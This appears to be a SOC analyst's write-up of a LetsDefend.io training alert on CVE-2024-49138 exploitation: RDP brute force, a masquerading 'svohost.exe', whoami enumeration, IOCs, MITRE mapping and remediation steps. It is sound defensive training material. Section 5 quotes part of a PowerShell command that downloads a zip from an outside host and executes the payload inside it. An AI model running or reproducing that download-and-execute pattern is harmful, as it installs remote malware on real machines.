#  Incident 2 â€“ Privilege Escalation via CVE Exploitation

**Platform:** LetsDefend.io  
**Incident ID:** 313  
**Rule Name:** SOC335 â€“ CVE-2024â€“49138 Exploitation Detected  
**Severity:** Medium  
**Type:** Privilege Escalation  
**Status:** Closed â€“ True Positive  

---

## 1. Incident Overview

A SOC335 alert was triggered after suspicious behavior consistent with exploitation of **CVE-2024â€“49138** was detected on host **Victor**. The investigation revealed that an attacker successfully gained remote access via RDP brute force, leveraged PowerShell to download and execute a malicious payload masquerading as a legitimate Windows process, and achieved **SYSTEM-level privilege escalation**.

### ðŸ“¸ Screenshot  
 Alert overview showing rule name, severity, and event ID_

![Alert Overview](Screenshots/01_alert_overview.png)


---

## 2. Alert Metadata

- **Event Time:** Jan 22, 2025 â€“ 02:37 AM  
- **Log Source:** Endpoint Security  
- **Affected Host:** Victor  
- **Host IP:** 172.16.17.207  
- **Operating System:** Windows 10 (64-bit)  
- **Device Action:** Allowed  


## 3. Initial Access â€“ Authentication Analysis

Log analysis revealed multiple authentication attempts originating from an external IP address. The attacker initially failed authentication using common usernames before successfully logging in via RDP.

### Observed Events
- **Event ID 4625:** Failed logon attempts (`admin`, `guest`)  
- **Event ID 4624:** Successful logon (`Victor`)  
- **Logon Type:** 10 (RemoteInteractive â€“ RDP)  
- **Source IP:** 185.107.56.141  

### ðŸ“¸ Screenshot  
 Raw authentication logs showing failed and successful logons_

![Authentication Logs](Screenshots/02_authentication_logs.png)
![Authentication Logs](Screenshots/03_authentication_logs.png)


---

## 4. Threat Intelligence Correlation

The source IP involved in the authentication attempts was investigated using LetsDefend Threat Intelligence.

### Findings
- **IP:** 185.107.56.141  
- **Threat Tag:** Brute Force  
- **Confidence:** Malicious behavior confirmed  

### ðŸ“¸ Screenshot  
 Threat Intel lookup for malicious IP_

![Threat Intel IP](Screenshots/04_threat_intel_ip.png)


---

## 5. Exploitation & Execution Analysis

Following successful RDP access, PowerShell was used to download and execute a malicious payload from an external S3 bucket.

### PowerShell Command Observed

```powershell
$url = 'https://files-ld.s3.us-east-2.amazonaws.com/service-installer.zip'
$dest = 'C:\temp\service-installer.zip'
...
Start-Process -FilePath "$extractPath\service_installer\svohost.exe"
```

### ðŸ“¸ Screenshot  
 Terminal history showing PowerShell execution_

![PowerShell Execution](Screenshots/05_powershell_execution.png)


---

## 6. Process Analysis

A suspicious binary named **svohost.exe** (masquerading as `svchost.exe`) was executed from a temporary directory.

### Process Details

- **Process Name:** svohost.exe  
- **Process ID:** 7640  
- **Execution Path:** `C:\temp\service_installer\svohost.exe`  
- **Parent Process:** powershell.exe  
- **Execution User:** SYSTEM  

### ðŸ“¸ Screenshot  
 Process tree showing PowerShell â†’ svohost.exe_

![Process Tree](Screenshots/06_process_tree.png)


---

## 7. File Reputation Analysis

The extracted binary was analyzed using external reputation services.

### File Details

- **File Name:** svohost.exe  
- **SHA-256 Hash:**  
  `b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9`  
- **Detection Rate:** 50+ security vendors flagged as malicious  
- **Classification:** Exploit / Privilege Escalation Malware  

### ðŸ“¸ Screenshot  
 File hash reputation analysis_

![File Hash Analysis](Screenshots/07_file_hash_analysis.png)


---

## 8. Privilege Escalation & Post-Exploitation Activity

Post-execution activity confirmed privilege escalation through enumeration commands.

### Commands Observed

- `whoami`  
- `whoami /priv`  

These commands indicate the attacker was validating elevated privileges after successful exploitation.

### ðŸ“¸ Screenshot  
 Terminal history showing privilege enumeration_

![Privilege Enumeration](Screenshots/08_privilege_enumeration.png)


---

## 9. Indicators of Compromise (IOCs)

### Network
- **Malicious IP:** 185.107.56[.]141  

### File
- **SHA-256:**  
  b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9  

### Command Line

```text
powershell.exe â†’ download â†’ extract â†’ execute svohost.exe
```

---

## 10. Response & Containment

- Host **Victor** was successfully **contained**  
- Malicious execution was halted  
- Artifacts documented for threat intelligence enrichment  


## 10. MITRE ATT&CK Mapping (Summary)

- **T1110 â€“ Brute Force:** Multiple failed RDP login attempts observed.
- **T1078 â€“ Valid Accounts:** Successful RDP login using valid credentials.
- **T1021.001 â€“ Remote Desktop Protocol:** Remote access via RDP.
- **T1059.001 â€“ PowerShell:** PowerShell used to download and execute payload.
- **T1036 â€“ Masquerading:** Malicious binary (`svohost.exe`) mimicked `svchost.exe`.
- **T1027 â€“ Obfuscated/Compressed Files:** Password-protected ZIP used to deliver malware.
- **T1068 â€“ Exploitation for Privilege Escalation:** CVE exploited to gain SYSTEM access.
- **T1033 â€“ User Discovery:** `whoami` executed.
- **T1069 â€“ Permission Groups Discovery:** `whoami /priv` executed.


## 11. Final Analyst Verdict

- **True Positive**  
- Confirmed exploitation of **CVE-2024â€“49138**  
- Successful RDP brute-force access followed by privilege escalation  
- Incident fully investigated, contained, and closed  

---

## 12. Recommended Actions

### Containment
- Isolate the affected host (**Victor**) from the network.
- Block the attacker IP (**185.107.56.141**) at firewall level.
- Disable RDP access and terminate the malicious process **svohost.exe**.
- Disable the compromised user account.

---

### Threat Hunting
- Review logs for RDP brute-force attempts (Logon Type 10).
- Hunt for PowerShell-based download and execution activity.
- Search for look-alike system binaries executed from temporary directories.

---

### Eradication
- Remove all malicious files and payloads.
- Eliminate persistence mechanisms (services, tasks, registry keys).
- Reset affected credentials or reimage the host if required.

---

### Mitigation & Prevention
- Patch systems vulnerable to **CVE-2024-49138**.
- Restrict RDP exposure and enforce MFA.
- Enable PowerShell logging and EDR detections for privilege escalation behavior.

---


## 13. Analyst Notes

This incident highlights the importance of:

- Monitoring **PowerShell abuse**  
- Detecting **look-alike system binaries**  
- Correlating authentication logs with endpoint behavior  
- Enforcing strong RDP access controls and network segmentation  

---